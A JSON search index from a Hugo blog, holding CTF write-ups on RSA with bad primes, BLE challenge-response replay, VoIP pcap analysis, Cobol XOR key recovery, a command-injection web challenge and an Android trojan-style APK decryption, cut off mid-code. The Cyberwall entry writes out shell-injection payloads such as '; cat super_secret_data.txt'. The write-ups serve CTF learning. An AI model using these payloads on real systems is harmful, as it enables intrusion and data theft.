[{"categories":null,"content":"About LoveIt","date":"2019-08-02","objectID":"/about/","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"  LoveIt is a clean, elegant but advanced blog theme for Hugo developed by  Dillon. It is based on the original LeaveIt Theme and KeepIt Theme. Hugo Theme LoveItHugo Theme LoveIt \" Hugo Theme LoveIt ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Features ","date":"2019-08-02","objectID":"/about/:1:0","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Performance and SEO  Optimized for performance: 99/100 on mobile and 100/100 on desktop in Google PageSpeed Insights  Optimized SEO performance with a correct SEO SCHEMA based on JSON-LD  Google Analytics supported  Fathom Analytics supported  Plausible Analytics supported  Yandex Metrica supported  Search engine verification supported (Google, Bind, Yandex and Baidu)  CDN for third-party libraries supported  Automatically converted images with Lazy Load by lazysizes ","date":"2019-08-02","objectID":"/about/:1:1","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Appearance and Layout  Desktop/Mobile responsive layout  Light/Dark mode  Globally consistent design language  Pagination supported  Easy-to-use and self-expanding table of contents  Multilanguage supported and i18n ready  Beautiful CSS animation ","date":"2019-08-02","objectID":"/about/:1:2","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Social and Comment Systems  Gravatar supported by Gravatar  Local Avatar supported  Up to 73 social links supported  Up to 24 share sites supported  Disqus comment system supported by Disqus  Gitalk comment system supported by Gitalk  Valine comment system supported by Valine  Facebook comments system supported by Facebook  Telegram comments system supported by Comments  Commento comment system supported by Commento  utterances comment system supported by utterances  giscus comment system supported by giscus ","date":"2019-08-02","objectID":"/about/:1:3","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Extended Features  Search supported by Lunr.js or algolia  Twemoji supported  Automatically highlighting code  Copy code to clipboard with one click  Images gallery supported by lightGallery  Extended Markdown syntax for Font Awesome icons  Extended Markdown syntax for ruby annotation  Extended Markdown syntax for fraction  Mathematical formula supported by $\\KaTeX$  Diagrams shortcode supported by mermaid  Interactive data visualization shortcode supported by ECharts  Mapbox shortcode supported by Mapbox GL JS  Music player shortcode supported by APlayer and MetingJS  Bilibili player shortcode  Kinds of admonitions shortcode  Custom style shortcode  Custom script shortcode  Animated typing supported by TypeIt  Cookie consent banner supported by cookieconsent  Person shortcode … ","date":"2019-08-02","objectID":"/about/:1:4","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"License LoveIt is licensed under the MIT license. Check the LICENSE file for details. ","date":"2019-08-02","objectID":"/about/:2:0","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Special Thanks Thanks to the authors of following resources included in the theme: normalize.css Font Awesome Simple Icons Animate.css autocomplete Lunr.js algoliasearch lazysizes object-fit-images Twemoji emoji-data lightGallery clipboard.js Sharer.js TypeIt $\\KaTeX$ mermaid ECharts Mapbox GL JS APlayer MetingJS Gitalk Valine cookieconsent ","date":"2019-08-02","objectID":"/about/:3:0","tags":null,"title":"About LoveIt","uri":"/about/"},{"categories":null,"content":"Bad Primes 86 solves Easy Category: Crypto Author: midao Description : “I thought I understood the RSA primitive but apparently I generated the primitive’s primes too primitively… \" 193 points Understanding the issue The challenge comes with Python code which implements RSA encryption/decryption. #!/usr/bin/env python2 import binascii # https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm def xgcd(a, b): x0, x1, y0, y1 = 0, 1, 1, 0 while a != 0: (q, a), b = divmod(b, a), a y0, y1 = y1, y0 - q * y1 x0, x1 = x1, x0 - q * x1 return b, x0, y0 # https://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm def modinv(a, m): g, x, y = xgcd(a, m) if g != 1: return None else: return x % m n = 3283820208958447696987943374117448908009765357285654693385347327161990683145362435055078968569512096812028089118865534433123727617331619214412173257331161 p = 34387544593670505224894952205499074005031928791959611454481093888481277920639 q = 95494466027181231798633086231116363926111790946014452380632032637864163116199 e = 65537 # flag = \"flag{...}\" # flag = int(binascii.hexlify(flag), 16) # flag = pow(flag, e, n) flag = 2152534604028570372634288477962037445130495144236447333908131330331177601915631781056255815304219841064038378099612028528380520661613873180982330559507116 d = modinv(e, (p - 1) * (q - 1)) if d == None: print \"definitely too primitive...\" else: print pow(flag, d, n) When we run the program, we get definitely too primitive, because d cannot be inversed. Let’s try and understand why. The 4 integers for RSA are provided: n, p, q and e: n is the modulus. n=p*q. We check this is true: print \"Je verifie n\" myn = p * q if myn == n: print \"n is correct\" else: print \"n is not correct\" p and q are 2 prime numbers. We check they are prime online. e is the public exponent, and value 65537 is extremly common. No problem with that. We are unable to compute the private exponent (d) which is part the the decryption key (d,n). The issue comes from the fact that unfortunately e is not prime with (p-1) * (q-1). In that case, this page explains that in that case it is impossible to decrypt the message in a unique way. I.e There are several possible decrypted messages Solution We are going to list all possible decrypted messages and keep the one which looks like a flag flag{...}. How can we get the decrypted messages when we cannot inverse e? The solution comes from this page. The algorithm explains how to compute possible plaintexts when e is no prime with (p-1)(q-1). We implement this algorithm. # xgcd returns a triplet. The GCD is g, the first element of the triplet g, x0, y0 = xgcd(p-1, q-1) # computing lambda l_lambda=(p-1)*(q-1) / g # we arbitraly select k = 2, could work with another value k = 2 # don't forget to use pow() and not ** L = pow(k, l_lambda/e, n) # we check L is not 1, if that was the case, we'd need to use another k - see algo assert L != 1 # Now we are able to compute d d = modinv(e, l_lambda/e) print \"d=\",d # Compute the various solutions and stop when it's the flag for i in range(0,e): ret = pow(pow(flag, d, n) * pow(L, i,n), 1, n) print \"Result: \", ret # Transform the integer to a string v = hex(ret).replace('0x','').replace('L','') if len(v) %2 != 0: # Odd string length: that's because we have something like 0xa at the beginning # instead of 0x0a. We need to add the 0. v = '0'+v s = binascii.unhexlify(v) print \"ASCII: \", s[0:20] if s[0:4] == 'flag': print \"FOUND\" print s quit() We get the flag: ... Result: 20954479300763094611764878148492851443855269259657142449817554915858952171015595866731757955253353010257834410311051564402462417563162248845880201671549 ASCII: flag{thanks_so_much_ FOUND flag{thanks_so_much_for_helping_me_with_these_primitive_primes} ","date":"0001-01-01","objectID":"/2020-10-28-badprimes/:0:0","tags":["hack.lu","CTF","2020","crypto"],"title":"Bad Primes - Hack.Lu CTF 2020","uri":"/2020-10-28-badprimes/"},{"categories":null,"content":"BeLE - Hardwear.io CTF 2022 The challenge is named “BeLE” and says there are several BLE devices + provides a Bluetooth PCAP file. ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:0:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"PCAP file The PCAP file is small with only 5 packets. The first packet is a BLE Read Request to read the BLE characteristic with handle 0x2a 02 10 00 07 00 03 00 04 00 0a 2a 00 The second packet is a BLE Read Response. The characteristic has value f3 dd 42 04 de ed c3 fc 0000 02 10 20 0d 00 09 00 04 00 0b f3 dd 42 04 de ed 0010 c3 fc The third packet is a BLE Write Command on handle 0x48. We wrote value 05 55 d7 37 b7 ad 8a 17 a1 a8 b1 be c4 70 f9 fe 0000 02 10 00 17 00 13 00 04 00 52 48 00 05 55 d7 37 0010 b7 ad 8a 17 a1 a8 b1 be c4 70 f9 fe The fourth packet is a BLE Read Request to read handle 0x39 02 10 00 07 00 03 00 04 00 0a 39 00 The fifth packet is the BLE Read Response. It apparently contained the flag, but was redacted. The answer is Flag_Here!. 0000 02 10 20 10 00 0c 00 04 00 0b 46 6c 61 67 5f 48 0010 65 72 65 21 21 ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:1:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"Investigating BLE devices To discover BLE devices, there are many tools like bluetoothctl, gatttool or simply a Bluetooth scanner on smartphone. We quickly spot the 2 BLE devices for the challenges, for example with bluetoothctl and command scan on [NEW] Device 58:BF:25:9F:B9:36 BeLE Device #02 [NEW] Device 78:E3:6D:1A:FF:52 BeLE Device #01 We pick one of the devices, pair (pair 58:BF:25:9F:B9:36) and connect (connect 58:BF:25:9F:B9:36). Then, we list the services and characteristics. The first few services (and their characteristics) are standard, and hold the device’s name. They are not interesting to solve the challenge. [NEW] Primary Service (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0001 00001801-0000-1000-8000-00805f9b34fb Generic Attribute Profile [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0001/char0002 00002a05-0000-1000-8000-00805f9b34fb Service Changed [NEW] Descriptor (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0001/char0002/desc0004 00002902-0000-1000-8000-00805f9b34fb Client Characteristic Configuration The services which are specific to the devices hold characteristics at handle 0x29, 0x38 and 0x47. This always 1 less than the handles to actually read/write to. This is because in BLE the value of a characteristic is held in its own handle. [NEW] Primary Service (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0028 f0248d4c-261a-11ed-861d-0242ac120002 Vendor specific [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0028/char0029 f65a7230-261a-11ed-861d-0242ac120002 Vendor specific [NEW] Primary Service (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0037 3ef82f7c-2114-4a08-9ead-85fce4757fca Vendor specific [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0037/char0038 84af9714-264c-11ed-a261-0242ac120002 Vendor specific [NEW] Primary Service (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0046 4fafc201-1fb5-459e-8fcc-c5c9c331914b Vendor specific [NEW] Characteristic (Handle 0x0000) /org/bluez/hci0/dev_58_BF_25_9F_B9_36/service0046/char0047 beb5483e-36e1-4688-b7f5-ea07361b26a8 Vendor specific Note we can get the same results gatttool or a smartphone BLE scanner. Actually, the results are often easier to read. sudo gatttool -b 58:BF:25:9F:B9:36 -I --sec-level=high [58:BF:25:9F:B9:36][LE]\u003e connect ... [58:BF:25:9F:B9:36][LE]\u003e characteristics handle: 0x0002, char properties: 0x20, char value handle: 0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb handle: 0x0015, char properties: 0x02, char value handle: 0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb handle: 0x0017, char properties: 0x02, char value handle: 0x0018, uuid: 00002a01-0000-1000-8000-00805f9b34fb handle: 0x0019, char properties: 0x02, char value handle: 0x001a, uuid: 00002aa6-0000-1000-8000-00805f9b34fb handle: 0x0029, char properties: 0x02, char value handle: 0x002a, uuid: f65a7230-261a-11ed-861d-0242ac120002 handle: 0x0038, char properties: 0x02, char value handle: 0x0039, uuid: 84af9714-264c-11ed-a261-0242ac120002 handle: 0x0047, char properties: 0x08, char value handle: 0x0048, uuid: beb5483e-36e1-4688-b7f5-ea07361b26a8 ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:2:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"Attempts We can read on handle 0x2a and 0x39, but can only write on handle 0x48. We attempt to replay the value of the pcap. [58:BF:25:9F:B9:36][LE]\u003e char-read-hnd 0x002a Characteristic value/descriptor: 66 13 e1 f5 2c 98 28 eb [58:BF:25:9F:B9:36][LE]\u003e char-write-req 0x0048 \"0555d737b7ad8a17a1a8b1bec470f9fe\" Characteristic value was written successfully [58:BF:25:9F:B9:36][LE]\u003e char-read-hnd 0x0039 Characteristic value/descriptor: 4e 6f 70 20 21 In handle 0x39, we read 4e 6f 70 20 21 which is ASCII for Nop !. So, our input is incorrect and does not yield the flag. We quickly notice that each time we write to 0x48, a new value is generated in 0x2a. So, probably this is a challenge / response mechanism: We are expected to read a challenge nonce on handle 0x2a We are expected to write the corresponding challenge response on handle 0x48 If our response is correct, handle 0x39 will probably yield the flag. ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:3:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"Relation between challenge and response The nonce is 8 bytes long. Too big to brute force and attempt numerous connections and hope to fall back on the nonce of the PCAP for which we have the correct answer. The expected answers is 16 bytes long. At this point, we went to have a look at the BLE devices. They are ESP32 devices. So, how could an ESP32 generate easily a 16-byte response? Encryption… Hash… SHA1? too long. MD5 produces the right output length. import hashlib m = hashlib.md5() m.update(b'\\xf3\\xdd\\x42\\x04\\xde\\xed\\xc3\\xfc') m.hexdigest() The output is fef970c4beb1a8a1178aadb737d75505. This is exactly bytes 05 55 d7 37 b7 ad 8a 17 a1 a8 b1 be c4 70 f9 fe but in the reverse order! ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:4:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"Flag We connect once again to a BLE device and read the nonce: [58:BF:25:9F:B9:36][LE]\u003e char-read-hnd 0x002a Characteristic value/descriptor: 62 58 66 59 0d 9c 3f 3e Then we compute its MD5 value m = hashlib.md5() m.update(b'\\x62\\x58\\x66\\x59\\x0d\\x9c\\x3f\\x3e') m.hexdigest() The output is df5e543a2cbc43508be6d23dc06fa213. If we reverse the order, it is 13a26fc03dd2e68b5043bc2c3a545edf. We write this response to the device: [58:BF:25:9F:B9:36][LE]\u003e char-write-req 0x0048 \"13a26fc03dd2e68b5043bc2c3a545edf Characteristic value was written successfully Then we read the result on handle 0x39: [58:BF:25:9F:B9:36][LE]\u003e char-read-hnd 0x0039 Characteristic value/descriptor: 46 4c 41 47 7b 4d 79 5f 43 68 34 72 5f 73 33 6e 64 5f 34 5f 63 68 34 72 5f 34 72 72 34 79 21 7d f = '46 4c 41 47 7b 4d 79 5f 43 68 34 72 5f 73 33 6e 64 5f 34 5f 63 68 34 72 5f 34 72 72 34 79 21 7d' bytes.fromhex(f.replace(' ','')) The answer is : FLAG{My_Ch4r_s3nd_4_ch4r_4rr4y!}. We’ve got the flag :) ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:5:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"Troubles I didn’t mention This challenge was relatively simple but took me more time than expected for several reasons: At first, I wrongly extracted the payload of the BLE Write Command and thought we were sending 52 48 00 05 55 d7 37 b7 ad 8a 17 a1 a8 b1 be c4 70 f9 fe. This is 19 bytes, and does not correspond to any known hash or encryption result length. I realized then my mistake, removed the 3 heading bytes (which actually contain the reference to handle 0x48) and kept the remaining 16 bytes. I didn’t immediately recognize the MD5 digest. Maybe it took me 5 minutes to see it was reversed. Although it was pretty obvious. In the end, I was sure I had understood the correct challenge/response mechanism but faced many problems to connect back to the BLE device. Fortunately, I have worked with BLE before and know they are touchy, so I patiently tried again and again, checked I was not paired, asked the organizers to reboot the devices. At some point, I was able to connect with my smartphone, but it’s not easy to enter 16 bytes and I did it wrong and did not flag. I was still unable to connect from my laptop. I finally decided to reboot it, and it worked straight away afterwards: connect, get nonce, send response, collect flag :) ","date":"0001-01-01","objectID":"/2022-10-28-hardweario-bele/:6:0","tags":["Hardwear.io","CTF","2022","BLE"],"title":"BeLE - Hardwear.io 2022","uri":"/2022-10-28-hardweario-bele/"},{"categories":null,"content":"Callboy 207 solves Baby Category: Misc Author: p4ck3to Description : “Have you ever called a Callboy? No!? Then you should definitely try it. To make it a pleasant experience for you, we have recorded a call with our Callboy to help you get started, so that there is no embarrassing silence between you. PS: do not forget the to wrap flag{} around the secret \" 127 points An overview of network packets The file we download is a network packet capture. We see: Many packets coming from the leet IP address 10.13.37.86 Contacts to theannoyingsite.com (50.116.11.184). At first I thought that might be interesting, but it was just a false lead. VoIP communications with RTCP and RTP (coming from sip:p4ck3t0@10.13.37.86.CLinphone Desktop) VoIP communication In Wireshark, you load the communication (Telephony \u003e VoIP Calls). Then, you click on “Play Streams” (can be a little bit long to load). In my case, it didn’t work. See the screenshot below: Wireshark didn’t recognize any output device to play the sound! Though I do have an output device… Another member of the team tried on his host. Same issue. In the end, the solution was to download a more recent version of Wireshark and it played like a charm. A voice would spell the flag. Although it is a common advice: use up-to-date software, I didn’t find it cool that the solution to this challenge only depended on the version of wireshark you had :( ","date":"0001-01-01","objectID":"/2020-10-28-callboy/:0:0","tags":["hack.lu","CTF","2020","VoIP"],"title":"Callboy - Hack.Lu CTF 2020","uri":"/2020-10-28-callboy/"},{"categories":null,"content":"Cobol OTP Category: Crypto Author: midao Level: easy Solves: 104 Thanks to R. who actually flagged it :) ","date":"0001-01-01","objectID":"/2019-10-24-cobol/:0:0","tags":["hack.lu","CTF","2019"],"title":"Cobol OTP - Hack.Lu CTF 2019","uri":"/2019-10-24-cobol/"},{"categories":null,"content":"Description To save the future you have to look at the past. Someone from the inside sent you an access code to a bank account with a lot of money. Can you handle the past and decrypt the code to save the future? ","date":"0001-01-01","objectID":"/2019-10-24-cobol/:1:0","tags":["hack.lu","CTF","2019"],"title":"Cobol OTP - Hack.Lu CTF 2019","uri":"/2019-10-24-cobol/"},{"categories":null,"content":"Attached file A zip is provided with: otp.cob: a program in Cobol out Enter your message to encrypt: ï¿½ï¿½\u0013ï¿½y;\u0010dhuï¿½ï¿½Fï¿½]\u0017UjhCï¿½ï¿½-ï¿½1T`h\u0026ï¿½ï¿½Fï¿½1*T{\u0004_ï¿½ï¿½\u0006ï¿½p0\u00112J ","date":"0001-01-01","objectID":"/2019-10-24-cobol/:2:0","tags":["hack.lu","CTF","2019"],"title":"Cobol OTP - Hack.Lu CTF 2019","uri":"/2019-10-24-cobol/"},{"categories":null,"content":"Understanding the Cobol program We understand the Cobol program is performing XOR encryption using a key provided in a keyfille. file-control. select key-file assign to 'key.txt' We don’t have the key file of course, but we know that flags begin with flag{...}. This means that the data in the key data will be at most 50 characters. fd key-file. 01 key-data pic x(50). This allocates two variables: ws-flag which contains 1 characters and ws-key with at most 50. Then we have ws-xor-len composed of at most 1 digit (so 0 to 9), and ws-ctr, a counter, one digit as well. 01 ws-flag pic x(1). 01 ws-key pic x(50). ... 01 ws-xor-len pic 9(1) value 1. 77 ws-ctr pic 9(1). In Cobol, the program instructions begin at procedure division. We read the key file. procedure division. open input key-file. read key-file into ws-key end-read. Then, we ask for the message to encrypt, and initialize the counter to 1. display 'Enter your message to encrypt:'. move 1 to ws-ctr. Then, we loop 50 times (because the message has 50 characters) to encrypt each character. By the way, we check that indeed our encrypted message has 50 characters (actually 49 + \\n). For each character, we read one character of the message to encrypt and put it in ws-parse. We also copy it on ws-flag which is the variable which will hold the encrypted character. Then, we call XOR on ws-flag using the i-th character of the key (using the counter ws-ctr). Finally we increment the counter. perform 50 times call 'getchar' end-call move return-code to ws-parse move ws-parse to ws-flag call 'CBL_XOR' using ws-key(ws-ctr:1) ws-flag by value ws-xor-len end-call display ws-flag with no advancing add 1 to ws-ctr end-add end-perform. ","date":"0001-01-01","objectID":"/2019-10-24-cobol/:3:0","tags":["hack.lu","CTF","2019"],"title":"Cobol OTP - Hack.Lu CTF 2019","uri":"/2019-10-24-cobol/"},{"categories":null,"content":"Compililng Cobol If you want to try the program, on Linux you can compile it using open-cobol package: $ cobc -free -x -o hack_otp otp.cob ","date":"0001-01-01","objectID":"/2019-10-24-cobol/:4:0","tags":["hack.lu","CTF","2019"],"title":"Cobol OTP - Hack.Lu CTF 2019","uri":"/2019-10-24-cobol/"},{"categories":null,"content":"Solution We know that the first few characters of the encrypted message must correspond to plaintext flag{. As the encryption algorithm is XOR, we can recover the first few bytes of the key: \u003e\u003e\u003e hex(0xa6 ^ ord('f')) '0xc0' \u003e\u003e\u003e hex(0xd2 ^ ord('l')) '0xbe' \u003e\u003e\u003e hex(0x13 ^ ord('a')) '0x72' \u003e\u003e\u003e hex(0x96 ^ ord('g')) '0xf1' \u003e\u003e\u003e hex(0x79 ^ ord('{')) '0x2' So, the first bytes of the key are 0xc0, 0xbe, 0x72, 0xf1, 0x02. We set this as a key, and decrypt the entire message in a Python interpreter: \u003e\u003e\u003e from itertools import izip, cycle \u003e\u003e\u003e import string \u003e\u003e\u003e def xor(message,key): ... return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(message, cycle(key))) ... \u003e\u003e\u003e key='\\xc0\\xber\\xf1\\x02' \u003e\u003e\u003e message='\\xa6\\xd2\\x13\\x96y;\\x10dhu\\x9f\\xddF\\x9f]\\x17UjhC\\x8f\\x8c-\\x921\\x07T`h\u0026\\x9f\\xcdF\\x871*T{\\x04_\\xa6\\xeb\\x06\\xa4p0\\x112J' \u003e\u003e\u003e xor(message,key) 'flag{\\xfb\\xae\\x16\\x99w_c4n_\\xd7\\xeb\\x18\\x99AO2_c3\\xc7\\xea\\x12\\x99$_s4v3\\xea\\xea\\t\\xf5]fUtUr\\xf0\\xaf@\\xbb' It doesn’t work yet, because we miss characters for the key. We have only set 5 bytes but obviously it is not enough. We notice in the middle that we have something that prints out correctly: fUtUr, so this means that at some point we were correctly aligned with the key once again. As the message is 50 characters long, the key is likely to be a divider of 50. If 5 is not enough, then 10 probably. Slightly before fUtUr, we also see s4v3. We guess that in between we should have _th3_ for s4v3_th3_fUtUr. With that, we recover the rest of the key: beginning_key='\\xc0\\xber\\xf1\\x02' guess=xor(ciphertext[35:40], '_th3_') key = beginning_key+guess And then, we can decrypt the message with the correct 10 character long key and get the flag: flag{N0w_u_c4n_buy_CO2_c3rts_\u0026_s4v3_th3_fUtUrE1!} Here is the Python program that solves the challenge from itertools import izip, cycle import string def xor(message,key): return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(message, cycle(key))) beginning_key='\\xc0\\xber\\xf1\\x02' # this is the hex contained in the file named out ciphertext='\\xa6\\xd2\\x13\\x96y;\\x10dhu\\x9f\\xddF\\x9f]\\x17UjhC\\x8f\\x8c-\\x921\\x07T`h\u0026\\x9f\\xcdF\\x871*T{\\x04_\\xa6\\xeb\\x06\\xa4p0\\x112J' partial=xor(ciphertext,beginning_key) print partial # guess rest of key guess=xor(ciphertext[35:40], '_th3_') key = beginning_key+guess # decrypt print xor(ciphertext, key) ","date":"0001-01-01","objectID":"/2019-10-24-cobol/:5:0","tags":["hack.lu","CTF","2019"],"title":"Cobol OTP - Hack.Lu CTF 2019","uri":"/2019-10-24-cobol/"},{"categories":null,"content":"Cyberwall Category: web “We had problems with hackers, but now we got a enterprise firewall system build by a leading security company.\" with a link to http://chal.cybersecurityrumble.de:3812. ","date":"0001-01-01","objectID":"/2020-10-30-cyberwall/:0:0","tags":["CSR","CTF","2020","Web"],"title":"Cyberwall - Cyber Security Rumble CTF 2020","uri":"/2020-10-30-cyberwall/"},{"categories":null,"content":"Web page http://chal.cybersecurityrumble.de:3812 The source code of the page reveals password rootpw1337: \u003c!DOCTYPE html\u003e \u003chtml lang=\"de\"\u003e \u003chead\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/login.css\"\u003e \u003ctitle\u003eCyberwall\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript type=\"text/javascript\"\u003e function checkPw() { var pass = document.getElementsByName('passwd')[0].value; if (pass != \"rootpw1337\") { alert(\"This Password is invalid!\"); return false; } window.location.replace(\"management.html\"); } ... ","date":"0001-01-01","objectID":"/2020-10-30-cyberwall/:1:0","tags":["CSR","CTF","2020","Web"],"title":"Cyberwall - Cyber Security Rumble CTF 2020","uri":"/2020-10-30-cyberwall/"},{"categories":null,"content":"Debugging The debugging section has an HTTP form with a text to submit (POST): \u003ch1\u003eTest Host Connection\u003c/h1\u003e \u003cp\u003eSend a ping to a host, to heck your connection.\u003c/p\u003e \u003cform method=\"POST\"\u003e \u003cinput type=\"text\" name=\"target\"\u003e \u003cinput type=\"submit\" value=\"Ping!\" /\u003e \u003c/form\u003e The input of text is not correctly sanitized, so we try: ; ls: Then, we try ; cat super_secret_data.txt, which provides: CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225} This is the flag :) ","date":"0001-01-01","objectID":"/2020-10-30-cyberwall/:2:0","tags":["CSR","CTF","2020","Web"],"title":"Cyberwall - Cyber Security Rumble CTF 2020","uri":"/2020-10-30-cyberwall/"},{"categories":null,"content":"Draw APK - THCon 2021 14 solves 249 points ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:0:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"First steps As the challenge creator tells me this app is “based on a Trojan Horse” and it is “not recommended to install it on a real smartphone”, even if there is actually “no malicious payload”, I am very reluctant at first to test the app, even in an emulator. So, I start off with my favorite static analysis combination: DroidLysis and JEB. The results are disappointing, I spot several “suspicious” parts (use of com.andrognito for example) but they are False Positives. ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:1:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"Dexcalibur and Zip I decide therefore to run the app in an Android emulator, instrumented with Dexcalibur. I use the default set of hooks, and spawn the app. Nothing important happens until I click on the Settings menu. There, I notice the creation of a files.zip. I find this suspicious: apart if configuration elements are zipped (but why? storing them in shared preferences seems easier), I see no reason why the app would need to create a Zip file. I retrieve the zip file via ADB. It contains: ExtClass.enc: this file is obviously encrypted inf.enc: same, encrypted. theme.jpg: this file is a … PNG image. I don’t know why eog (Eye of Gnome) refuses to open it, but Gimp has no problem to open it. It says we have been pwned. So, I am obviously in the right direction :) ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:2:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"Dexcalibur and Dex Then, I notice in Dexcalibur that a Dalvik Executable is loaded (highly suspicious): I grab the DEX via ADB. It is a valid DEX file, that I immediately decompile. The code is simple, with a single class ExtClass, and methods such as isInfected() : exactly what I expect in a challenge. ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:3:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"ExtClass code The image of the Zip is used by the method changeWallpaper(). It sets it as wallpaper. public void changeWallpaper(Context arg7) { WallpaperManager wpm = WallpaperManager.getInstance(arg7); Bitmap bitmap = BitmapFactory.decodeFile(this.filesDir + \"/theme.jpg\"); try { wpm.setBitmap(bitmap); } catch(Exception e) { e.printStackTrace(); } } I am interested in method checkInf(), which decrypts inf.enc file. As this file is small (48 bytes), it could very well hold the encrypted flag. private String checkInf() { String path = this.filesDir + \"/inf.enc\"; try { SecretKeySpec key = new SecretKeySpec(MessageDigest.getInstance(\"SHA-256\").digest(\"y3t_@n0th3r_p@ssw0rd\".getBytes(StandardCharsets.UTF_8)), \"AES\"); IvParameterSpec iv = new IvParameterSpec(\"@n0th3r_f1x3d_1v\".getBytes(StandardCharsets.UTF_8)); Cipher cipher = Cipher.getInstance(\"AES_256/CBC/PKCS7Padding\"); cipher.init(2, key, iv); return new String(cipher.doFinal(Files.readAllBytes(Paths.get(path, new String[0])))); } catch(Exception e) { e.printStackTrace(); return null; } } I write the matching standalone Java code, but when I run it, it fails with no available provider for AES_256/CBC/PKCS7Padding. ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:4:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"How to lose time, silly At this point thinking that if my computer does not have this provider, for sure Android phones and emulators have it, so I am going to hook the decryption method doFinal and display the decrypted text. I hook doFinal and ensure that it displays the decrypted result (ret). Then, I spawn the malware (note each time, I have to uninstall it and re-install it, to run it clean): I considered hooking directly checkInf(), except I can’t with Dexcalibur because it is from dynamically loaded code and Dexcalibur does not find it. It is possible to write a Frida hook instead (without using Dexcalibur), but I’m lazy and don’t do it. So, I get the result of the decrypted text and re-build the file… except this is useless, because those bytes are not from inf.enc but the decrypted value of ExtClass.enc ! And unfortunately, I register no other call to doFinal() for inf.enc… Dead end. ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:5:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"Back on track I consider my Java decryption code and search on Internet why it does not find a provider for this algorithm and where I can find one. I bump into this page which says that PKCS7 padding is not supported by Java, only PKCS5 (naming issue see the stackoverflow page). So, I simply change PKCS7 padding to PKCS5 in my code. import java.io.*; import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Paths; import java.security.MessageDigest; import javax.crypto.Cipher; import javax.crypto.spec.IvParameterSpec; import javax.crypto.spec.SecretKeySpec; public class Decrypt { public static String path = \"./inf.enc\"; public static void main(String args[]) { try { SecretKeySpec key = new SecretKeySpec(MessageDigest.getInstance(\"SHA-256\").digest(\"y3t_@n0th3r_p@ssw0rd\".getBytes(Standa rdCharsets.UTF_8)), \"AES\"); IvParameterSpec iv = new IvParameterSpec(\"@n0th3r_f1x3d_1v\".getBytes(StandardCharsets.UTF_8)); Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); cipher.init(2, key, iv); System.out.println(\"Solution: \"+ new String(cipher.doFinal(Files.readAllBytes(Paths.get(path, new 